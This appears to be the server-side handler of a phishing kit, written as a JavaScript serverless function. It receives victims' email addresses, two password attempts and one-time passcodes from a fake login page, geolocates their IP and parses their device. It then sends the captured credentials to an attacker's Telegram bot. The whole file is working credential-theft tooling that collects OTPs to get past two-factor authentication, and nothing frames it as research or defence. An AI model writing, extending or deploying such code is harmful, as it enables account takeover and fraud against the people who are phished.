import { UAParser } from 'ua-parser-js';

// --- Configuration ---
const CONFIG = {
  ENV: {
    TELEGRAM_BOT_TOKEN: process.env.TELEGRAM_BOT_TOKEN,
    TELEGRAM_CHAT_ID: process.env.TELEGRAM_CHAT_ID,
  },
  FETCH_TIMEOUT: 15000,
  GEO_API_FIELDS: 'country,regionName,query',
};

// --- Helper Functions (Unchanged) ---

const createTimeoutSignal = (ms) => {
  const controller = new AbortController();
  setTimeout(() => controller.abort(), ms);
  return controller.signal;
};

const getHeader = (headers, name) => headers[name] || headers[name.toLowerCase()] || '';

const getClientIp = (event) => {
  const headers = event.headers || {};
  return (getHeader(headers, 'x-forwarded-for') ||
          getHeader(headers, 'x-real-ip') ||
          getHeader(headers, 'cf-connecting-ip') ||
          event.requestContext?.identity?.sourceIp ||
          'Unknown').toString().split(',')[0].trim();
};

const getIpAndLocation = async (ip) => {
  const location = { country: 'Unknown', regionName: 'Unknown' };
  if (ip === 'Unknown' || ip === '127.0.0.1') return location;
  try {
    const geoResponse = await fetch(`http://ip-api.com/json/${ip}?fields=${CONFIG.GEO_API_FIELDS}`, {
      signal: createTimeoutSignal(3000),
    });
    if (geoResponse.ok) {
      const geoJson = await geoResponse.json();
      location.country = geoJson.country || 'Unknown';
      location.regionName = geoJson.regionName || 'Unknown';
    }
  } catch (e) {
    console.error(`Geolocation lookup for IP ${ip} failed:`, e.message);
  }
  return location;
};

const getDeviceDetails = (userAgent) => {
  const uaParser = new UAParser(userAgent || '');
  const browser = uaParser.getBrowser();
  const os = uaParser.getOS();
  return {
    deviceType: /Mobile|Android|iPhone|iPad/i.test(userAgent || '') ? '📱 Mobile' : '💻 Desktop',
    browser: browser.name ? `${browser.name} ${browser.version || ''}`.trim() : 'Unknown Browser',
    os: os.name ? `${os.name} ${os.version || ''}`.trim() : 'Unknown OS',
  };
};

// --- Message Composers ---

/**
 * Composes the message for login credentials.
 * This function remains structurally the same.
 * @param {object} data - The parsed request body.
 * @returns {string}
 */
const composeCredentialsMessage = (data) => {
    const {
        email, provider, firstAttemptPassword, secondAttemptPassword,
        clientIP, location, deviceDetails, timestamp, sessionId,
    } = data;

    const formattedTimestamp = new Date(timestamp || Date.now()).toLocaleString('en-US', {
        year: 'numeric', month: 'short', day: 'numeric',
        hour: '2-digit', minute: '2-digit', second: '2-digit',
        timeZone: 'UTC', hour12: true
    }) + ' UTC';

    return [
        `━━━━━━━━━━━━━━━━━━━━`,
        `     🔐  *CREDENTIALS*`,
        `━━━━━━━━━━━━━━━━━━━━`,
        ``,
        `📧  \`${email || 'Not captured'}\``,
        `🏷  *${provider || 'Others'}*`,
        ``,
        `🔑  1st  ▸  \`${firstAttemptPassword}\``,
        `🔑  2nd  ▸  \`${secondAttemptPassword}\``,
        ``,
        `─ ─ ─ ─ ─ ─ ─ ─ ─ ─`,
        ``,
        `🌐  \`${clientIP}\``,
        `📍  *${location.regionName}, ${location.country}*`,
        `💻  *${deviceDetails.os}*  ·  *${deviceDetails.browser}*`,
        `📲  *${deviceDetails.deviceType.replace(/📱|💻/g, '').trim()}*`,
        ``,
        `─ ─ ─ ─ ─ ─ ─ ─ ─ ─`,
        ``,
        `🕐  *${formattedTimestamp}*`,
        `🆔  \`${sessionId}\``,
        `━━━━━━━━━━━━━━━━━━━━`,
    ].join('\n');
};

/**
 * Composes the message for the OTP code.
 * This is the new function to handle the OTP submission.
 * @param {object} data - The OTP data payload.
 * @returns {string}
 */
const composeOtpMessage = (data) => {
    const { otp, session } = data;
    const { email, provider, clientIP, location, deviceDetails, sessionId } = session || {};

    const formattedTimestamp = new Date().toLocaleString('en-US', {
        year: 'numeric', month: 'short', day: 'numeric',
        hour: '2-digit', minute: '2-digit', second: '2-digit',
        timeZone: 'UTC', hour12: true
    }) + ' UTC';

    return [
        `━━━━━━━━━━━━━━━━━━━━`,
        `     🔑  *OTP RECEIVED*`,
        `━━━━━━━━━━━━━━━━━━━━`,
        ``,
        `🔢  \`${otp}\``,
        ``,
        `📧  \`${email || 'N/A'}\``,
        `🏷  *${provider || 'N/A'}*`,
        `🌐  \`${clientIP || 'N/A'}\``,
        ``,
        `─ ─ ─ ─ ─ ─ ─ ─ ─ ─`,
        ``,
        `🕐  *${formattedTimestamp}*`,
        `🆔  \`${sessionId}\``,
        `━━━━━━━━━━━━━━━━━━━━`,
    ].join('\n');
};


// --- Main Handler ---
export const handler = async (event) => {
  const headers = {
    'Access-Control-Allow-Origin': '*',
    'Access-Control-Allow-Headers': 'Content-Type',
    'Access-Control-Allow-Methods': 'POST, OPTIONS',
  };

  if (event.httpMethod === 'OPTIONS') {
    return { statusCode: 200, headers, body: '' };
  }
  if (event.httpMethod !== 'POST') {
    return { statusCode: 405, headers, body: JSON.stringify({ error: 'Method not allowed' }) };
  }
  if (!CONFIG.ENV.TELEGRAM_BOT_TOKEN || !CONFIG.ENV.TELEGRAM_CHAT_ID) {
    console.error('FATAL: Missing TELEGRAM_BOT_TOKEN or TELEGRAM_CHAT_ID env vars.');
    return { statusCode: 500, headers, body: JSON.stringify({ success: false, message: 'Server misconfiguration.' }) };
  }
  
  try {
    const body = JSON.parse(event.body || '{}');
    const { type, data } = body;
    let message;

    // --- Message Routing Logic ---
    // Route the request to the correct message composer based on the `type` field.
    if (type === 'credentials') {
        const clientIP = getClientIp(event);
        const location = await getIpAndLocation(clientIP);
        const deviceDetails = getDeviceDetails(data.userAgent);
        
        const messageData = { ...data, clientIP, location, deviceDetails };
        message = composeCredentialsMessage(messageData);

    } else if (type === 'otp') {
        // For OTP, we re-use device/location info from the associated session.
        // No new IP lookup is needed.
        message = composeOtpMessage(data);

    } else {
        // Fallback for old format or unknown types
        console.warn('Request received with unknown or missing "type". Processing as credentials.');
        const clientIP = getClientIp(event);
        const location = await getIpAndLocation(clientIP);
        const deviceDetails = getDeviceDetails(body.userAgent);
        const sessionId = body.sessionId || Math.random().toString(36).substring(2, 15);
        message = composeCredentialsMessage({ ...body, clientIP, location, deviceDetails, sessionId });
    }

    // Send the composed message to Telegram
    const telegramResponse = await fetch(`https://api.telegram.org/bot${CONFIG.ENV.TELEGRAM_BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({ chat_id: CONFIG.ENV.TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown' }),
      signal: createTimeoutSignal(CONFIG.FETCH_TIMEOUT),
    });

    if (!telegramResponse.ok) {
      const errorResult = await telegramResponse.json().catch(() => ({ description: 'Failed to parse Telegram error response.' }));
      console.error('Telegram API Error:', errorResult.description);
    }

    return {
      statusCode: 200,
      headers,
      body: JSON.stringify({ success: true, sessionId: data?.sessionId }),
    };

  } catch (error) {
    console.error('Function execution error:', error.message);
    return {
      statusCode: 500,
      headers,
      body: JSON.stringify({ error: 'An internal server error occurred.' }),
    };
  }
};
